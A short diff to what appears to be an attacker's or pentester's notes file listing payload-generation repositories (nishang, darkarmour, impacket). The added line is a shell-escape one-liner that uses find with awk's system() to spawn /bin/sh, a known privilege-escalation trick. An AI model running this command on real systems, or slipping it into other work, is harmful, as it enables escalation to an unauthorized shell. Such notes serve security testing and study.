@@ -26,6 +26,8 @@ playloads generate:
   https://github.com/samratashok/nishang
   https://github.com/bats3c/darkarmour
 
+
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
   playloads xf:
     https://github.com/fortra/impacket      is a toolset built in Python that provides us with a way to interact with network protocols directly.
 
